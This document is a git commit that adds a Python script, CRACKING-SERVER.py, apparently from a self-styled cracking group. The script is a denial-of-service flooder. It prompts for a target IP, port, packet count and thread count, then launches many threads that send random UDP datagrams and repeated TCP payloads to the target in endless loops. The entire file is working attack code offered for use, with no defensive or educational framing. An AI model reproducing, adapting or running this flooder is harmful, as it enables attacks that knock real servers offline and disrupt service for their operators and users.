c47833d2af4ca8bde25197a164693b47dd167da8
CYBERCRACK404 <110366429+CYBERCRACK404@users.noreply.github.com>
2022-08-02 15:56:26 +0700

    Add files via upload

---
+++ CRACKING-SERVER.py
@@ -0,0 +1,249 @@
+import random
+import socket
+import threading
+import os,sys
+
+print("\033[92m========= CYBER CRACK404 =========") 
+print("\033[92m>> Author : CC & ALL TEAM") 
+print("\033[92m>>> Coded : ALL TEAM") 
+print("\033[92m>>>> CYBER CRACK 404")
+ip = str(input("IP TARGET:"))
+port = int(input("PORT TARGET:"))
+choice = str(input("START DDOS SERVER ?[y/n]:"))
+times = int(input("PACKET :"))
+threads = int(input("THREADS :"))
+os.system("clear")
+def run():
+    data = random._urandom(1800)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +"ATTACKING IP SERVER %s PORT SERVER  : %s"%(ip, port))
+        except:
+            print("SERVER IS OFFLINE")
+            
+def run2():
+    data = random._urandom(1024)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING IP SERVER %s PORT SERVER  : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+            
+def run3():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING IP SERVER %s PORT SERVER  : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+
+def run4():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING IP SERVER %s PORT SERVER  : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+            
+def run5():
+    data = random._urandom(1800)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +"ATTACKING IP SERVER %s PORT SERVER : %s"%(ip, port))
+        except:
+            print("SERVER IS OFFLINE")
+            
+def run6():
+    data = random._urandom(1024)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP %s PORT SERVER : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+            
+def run7():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+
+def run8():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP  %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+            
+def run9():
+    data = random._urandom(1800)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            addr = (str(ip),int(port))
+            for x in range(times):
+                s.sendto(data,addr)
+            print(i +"ATTACKING SERVER IP %s SERVER PORT : %s"%(ip, port))
+        except:
+            print("SERVER IS OFFLINE")
+            
+def run10():
+    data = random._urandom(1024)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP  %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+            
+def run11():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP  %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+
+def run12():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP  %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+            
+def run13():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP  %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+
+def run14():
+    data = random._urandom(16)
+    i = random.choice(("GO ","GO ","GO "))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip,port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i +"ATTACKING SERVER IP  %s SERVER PORT : %s"%(ip, port))
+        except:
+            s.close()
+            print("SERVER IS OFFLINE")
+for y in range(threads):
+    if choice == 'y':
+        th = threading.Thread(target = run)
+        th.start()
+        th = threading.Thread(target = run2)
+        th.start()
+        th = threading.Thread(target = run3)
+        th.start()
+        th = threading.Thread(target = run4)
+        th.start()
+        th = threading.Thread(target = run5)
+        th.start()
+        th = threading.Thread(target = run6)
+        th.start()
+        th = threading.Thread(target = run7)
+        th.start()
+        th = threading.Thread(target = run8)
+        th.start()
+        th = threading.Thread(target = run9)
+        th.start()
+        th = threading.Thread(target = run10)
+        th.start()
+        th = threading.Thread(target = run11)
+        th.start()
+        th = threading.Thread(target = run12)
+        th.start()
+        th = threading.Thread(target = run13)
+        th.start()
+else:
+        th = threading.Thread(target = run14)
+        th.start()
